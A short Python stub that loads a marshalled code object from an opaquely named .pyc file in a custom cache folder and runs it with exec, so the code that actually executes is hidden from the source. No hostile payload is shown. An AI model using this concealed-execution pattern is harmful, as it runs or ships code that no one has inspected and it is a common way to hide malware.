
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'auxiliary_e4b2deb3adaf452bbb52143b6a6b46d1.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
